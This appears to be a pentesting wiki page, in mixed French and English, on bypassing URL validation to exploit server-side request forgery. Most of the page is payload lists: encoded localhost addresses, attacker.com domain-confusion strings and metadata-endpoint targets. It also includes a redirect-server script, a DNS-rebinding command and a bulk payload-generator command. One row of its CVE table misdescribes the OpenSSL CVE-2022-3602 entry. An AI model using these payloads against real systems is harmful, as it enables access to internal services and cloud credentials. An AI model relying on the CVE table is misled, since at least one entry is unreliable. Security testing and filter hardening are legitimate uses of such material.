# URL Format Bypass

{{#include ../../banners/hacktricks-training.md}}

### Localhost

<details>
<summary>Localhost payloads</summary>
```bash
# Localhost
0 # Yes, just 0 is localhost in Linux
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CIDR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Mixed encodings bypass
169.254.43518 -> Partial Decimal (Class B) format combines the third and fourth parts of the IP address into a decimal number
0xA9.254.0251.0376 -> hexadecimal, decimal and octal

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
</details>

![](<../../images/image (776).png>)

L'**extension Burp** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) implémente des contournements de formatage d'adresses IP.

### Analyseur de domaines

<details>
<summary>Contournements de l'analyseur de domaines</summary>
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
# double encoded fragment to bypass split("#"): attacker.com%2523@victim
```
</details>
```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```
### Domain Confusion

<details>
<summary>Domain confusion payloads</summary>
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com
# colon + backslash confusion (CVE-2025-0454 in autogpt)
http://localhost:\@google.com/../

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

# Parameter pollution
next={domain}&next=attacker.com
```
</details>

### Bypass des chemins et des extensions

Si l'URL doit se terminer par un chemin ou une extension, ou doit contenir un chemin, vous pouvez essayer l'un des contournements suivants :
```
https://metadata/vulnerable/path#/expected/path
https://metadata/vulnerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

L'outil [**recollapse**](https://github.com/0xacb/recollapse) peut générer des variations à partir d'une entrée donnée pour tenter de contourner la regex utilisée. Consultez également [**this post**](https://0xacb.com/2022/11/21/recollapse/) pour plus d'informations.

### Wordlists personnalisées automatiques

Découvrez la webapp [**URL validation bypass cheat sheet**](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) de portswigger où vous pouvez indiquer l'hôte autorisé et celui de l'attaquant et elle générera une liste d'URLs à essayer pour vous. Elle considère aussi si vous pouvez utiliser l'URL dans un paramètre, dans un Host header ou dans un CORS header.


{{#ref}}
https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
{{#endref}}

### Contournement via redirection

Il est possible que le serveur **filtre la requête originale** d'une SSRF **mais pas** une éventuelle réponse de **redirection** à cette requête.\
Par exemple, un serveur vulnérable à SSRF via: `url=https://www.google.com/` peut **filtrer le param url**. Mais si vous utilisez un [python server to respond with a 302](https://pastebin.com/raw/ywAUhFrv) pour rediriger vers l'endroit voulu, vous pourriez être capable d'**accéder à des adresses IP filtrées** comme 127.0.0.1 ou même à des **protocoles** filtrés comme gopher.\
[Check out this report.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)

<details>
<summary>Redirecteur simple pour tester SSRF</summary>
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
</details>

### DNS rebinding bypass (2025+)

Même lorsqu'un filtre SSRF effectue une **résolution DNS unique avant d'envoyer la requête HTTP**, il est toujours possible d'atteindre des hôtes internes en effectuant un rebinding du domaine entre la résolution et la connexion :

1. Pointez `victim.example.com` vers une IP publique afin qu'il passe la allow‑list / le contrôle CIDR.
2. Servez un TTL très faible (ou utilisez un serveur autoritatif que vous contrôlez) et rebindez le domaine vers `127.0.0.1` ou `169.254.169.254` juste avant que la requête réelle ne soit effectuée.
3. Des outils comme **Singularity** (`nccgroup/singularity`) automatisent le serveur DNS autoritatif + HTTP et incluent des payloads prêts à l'emploi. Exemple de lancement : `python3 singularity.py --lhost <your_ip> --rhost 127.0.0.1 --domain rebinder.test --http-port 8080`.

Cette technique a été utilisée en 2025 pour bypasser le patch BentoML "safe URL" et des filtres SSRF à résolution unique similaires.

### Explained Tricks

#### Backslash-trick

Le _backslash-trick_ exploite une différence entre la [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) et [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B). Tandis que RFC3986 est un cadre général pour les URI, WHATWG est spécifique aux URL web et est adopté par les navigateurs modernes. La distinction clé réside dans la reconnaissance par la spécification WHATWG du backslash (`\`) comme équivalent du slash (`/`), ce qui impacte la manière dont les URLs sont parsées, et en particulier la transition entre le hostname et le path dans une URL.

![https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg)

#### Left square bracket

Le caractère “left square bracket” `[` dans le segment userinfo peut amener Spring’s UriComponentsBuilder à renvoyer une valeur d'hostname différente de celle des navigateurs : [https://example.com\[@attacker.com](https://portswigger.net/url-cheat-sheet#id=1da2f627d702248b9e61cc23912d2c729e52f878)

#### Other Confusions

![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../images/image (600).png>)

image from [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

#### IPv6 Zone Identifier (%25) Trick

Les parseurs d'URL modernes qui supportent RFC 6874 permettent aux adresses IPv6 *link-local* d'inclure un **zone identifier** après un signe pourcentage. Certains filtres de sécurité ne sont pas au courant de cette syntaxe et ne retirent que les littéraux IPv6 entre crochets, laissant le payload suivant atteindre une interface interne :
```text
http://[fe80::1%25eth0]/          # %25 = encoded '%', interpreted as fe80::1%eth0
http://[fe80::a9ff:fe00:1%25en0]/ # Another example (macOS style)
```
Si l'application cible vérifie que l'hôte n'est *pas* `fe80::1` mais arrête l'analyse au niveau du `%`, elle peut considérer à tort la requête comme externe. Normalisez toujours l'adresse **avant** toute décision de sécurité ou supprimez entièrement l'identifiant de zone optionnel.

### CVE récentes de parsing des bibliothèques (2022–2026)

Plusieurs frameworks grand public ont souffert de problèmes de non‑correspondance de nom d'hôte qui peuvent être exploités pour SSRF une fois la validation d'URL contournée avec les astuces listées ci‑dessus :

| Year | CVE | Component | Bug synopsis | Minimal PoC |
|------|-----|-----------|--------------|-------------|
| 2025 | CVE-2025-0454 | Python `requests` + `urllib.parse` (autogpt) | Décalage d'analyse sur `http://localhost:\\@google.com/../` permettant aux allow‑lists de penser que l'hôte est `google.com` alors que la requête atteint `localhost`. | `requests.get("http://localhost:\\@google.com/../")` |
| 2025 | CVE-2025-2691 | Node package `nossrf` | La bibliothèque destinée à bloquer SSRF ne vérifie que le nom d'hôte original, pas l'**IP résolue**, permettant des noms d'hôtes qui résolvent en plages privées. | `curl "http://trusted.example" --resolve trusted.example:80:127.0.0.1` |
| 2024 | CVE-2024-29415 | Node `ip` package | `isPublic()` a mal classé le localhost en notation dotted‑octal / forme courte (par ex., `0127.0.0.1`, `127.1`) comme public, permettant aux filtres d'accepter des cibles internes. | `ip.isPublic('0127.0.0.1')` returns true on vulnerable versions |
| 2024 | CVE-2024-3095 | Langchain WebResearchRetriever | Pas de filtrage d'hôte ; des requêtes GET pouvaient atteindre IMDS/localhost depuis des agents AI. | User‑controlled URL inside `WebResearchRetriever` |
| 2024 | CVE-2024-22243 / ‑22262 | Spring `UriComponentsBuilder` | `[` dans userinfo analysé différemment par Spring vs navigateurs, permettant un contournement d'allow‑list. | `https://example.com\[@internal` |
| 2023 | CVE-2023-27592 | **urllib3** <1.26.15 | Confusion avec le backslash permettant à `http://example.com\\@169.254.169.254/` de contourner les filtres d'hôte qui se séparent sur `@`. | — |
| 2022 | CVE-2022-3602 | OpenSSL | La vérification du nom d'hôte était ignorée lorsque le nom était suffixé par un `.` (confusion entre domaine avec et sans point). | — |

### Aides à la génération de payloads (2024+)

Créer de grandes word‑lists personnalisées à la main est fastidieux. L'outil open-source **SSRF-PayloadMaker** (Python 3) peut maintenant générer automatiquement *80 k+* combinaisons de manipulation d'hôtes, incluant encodages mixtes, rétrogradation forcée vers HTTP et variantes avec backslash :
```bash
# Generate every known bypass that transforms the allowed host example.com to attacker.com
python3 ssrf_maker.py --allowed example.com --attacker attacker.com -A -o payloads.txt
```
La liste résultante peut être fournie directement à Burp Intruder ou à `ffuf`.

## Références

- [https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25](https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
- [https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet](https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-22243](https://nvd.nist.gov/vuln/detail/CVE-2024-22243)
- [https://github.com/hsynuzm/SSRF-PayloadMaker](https://github.com/hsynuzm/SSRF-PayloadMaker)
- [https://medium.com/%40narendarlb123/1-cve-2025-0454-autogpt-ssrf-via-url-parsing-confusion-921d66fafcbe](https://medium.com/%40narendarlb123/1-cve-2025-0454-autogpt-ssrf-via-url-parsing-confusion-921d66fafcbe)
- [https://www.tenable.com/blog/how-tenable-bypassed-patch-for-bentoml-ssrf-vulnerability-CVE-2025-54381](https://www.tenable.com/blog/how-tenable-bypassed-patch-for-bentoml-ssrf-vulnerability-CVE-2025-54381)

{{#include ../../banners/hacktricks-training.md}}
